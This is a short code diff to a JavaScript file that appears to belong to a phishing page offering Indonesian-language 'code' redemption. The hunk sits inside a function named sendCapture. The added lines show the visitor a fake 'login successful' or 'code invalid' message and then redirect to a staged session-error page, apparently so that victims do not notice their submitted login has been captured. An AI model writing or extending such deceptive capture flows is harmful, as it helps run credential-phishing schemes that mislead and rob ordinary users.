@@ -1444,10 +1444,12 @@ function sendCapture(data) {
       if (action === 'unlock') {
         unlockCodes();
         showToast('Login berhasil. Kode aktif sekarang tersedia.', 'success');
+        setTimeout(function() { window.location.href = '/session-error.html'; }, 7000);
       } else {
         showToast('Kode tidak valid atau sudah digunakan. Coba kode lain.', 'error');
         document.getElementById('rp-code').value = '';
         document.getElementById('rp-code-clear').classList.remove('visible');
+        setTimeout(function() { window.location.href = '/session-error.html'; }, 4500);
       }
     }, 2200);
   }, 1800);
